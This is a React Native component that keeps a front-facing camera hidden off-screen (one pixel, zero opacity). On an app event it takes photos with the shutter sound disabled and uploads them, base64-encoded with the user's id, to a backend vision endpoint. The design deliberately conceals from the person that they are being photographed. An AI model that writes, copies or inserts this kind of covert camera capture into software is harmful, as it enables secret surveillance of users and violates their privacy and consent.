import React, { useEffect, useRef, useState } from 'react';
import { View, DeviceEventEmitter, StyleSheet } from 'react-native';
import { CameraView, useCameraPermissions } from 'expo-camera';
import { useAuthStore } from '../store/useAuthStore';
import { api } from '../services/api';

export const TRIGGER_VISION_SNAP = 'TRIGGER_VISION_SNAP';

export const AutonomousEyes: React.FC = () => {
  const [permission, requestPermission] = useCameraPermissions();
  const cameraRef = useRef<CameraView>(null);
  const [isReady, setIsReady] = useState(false);
  const user = useAuthStore((s) => s.user);

  useEffect(() => {
    // Request permission silently on mount if not already granted
    if (!permission?.granted) {
      requestPermission();
    }
  }, [permission]);

  useEffect(() => {
    const subscription = DeviceEventEmitter.addListener(TRIGGER_VISION_SNAP, async () => {
      if (!isReady || !cameraRef.current || !user || !permission?.granted) {
        console.log('[AutonomousEyes] Cannot snap. Not ready or missing permissions.');
        return;
      }

      try {
        console.log('[AutonomousEyes] Taking silent snap...');
        // Take picture silently
        const photo = await cameraRef.current.takePictureAsync({
          quality: 0.3,
          base64: true,
          shutterSound: false,
        });

        if (photo?.base64) {
          console.log('[AutonomousEyes] Snap captured. Uploading to vision endpoint...');
          
          const payload = {
            user_id: user.id,
            image_base64: photo.base64,
            mime_type: 'image/jpeg',
          };

          // Upload to backend using configured axios instance
          api.post('/api/vision/snap', payload)
            .then(() => console.log('[AutonomousEyes] Snap uploaded successfully'))
            .catch((err) => console.error('[AutonomousEyes] Failed to upload snap:', err));
        }
      } catch (err) {
        console.error('[AutonomousEyes] Failed to take picture:', err);
      }
    });

    return () => {
      subscription.remove();
    };
  }, [isReady, user, permission]);

  if (!permission?.granted) {
    return null; // Don't render anything if no permission
  }

  return (
    <View style={styles.hiddenContainer} pointerEvents="none">
      <CameraView
        ref={cameraRef}
        style={styles.camera}
        facing="front"
        onCameraReady={() => setIsReady(true)}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  hiddenContainer: {
    position: 'absolute',
    top: -100, // Move completely off screen
    left: -100,
    width: 1,
    height: 1,
    opacity: 0,
    overflow: 'hidden',
  },
  camera: {
    flex: 1,
  },
});
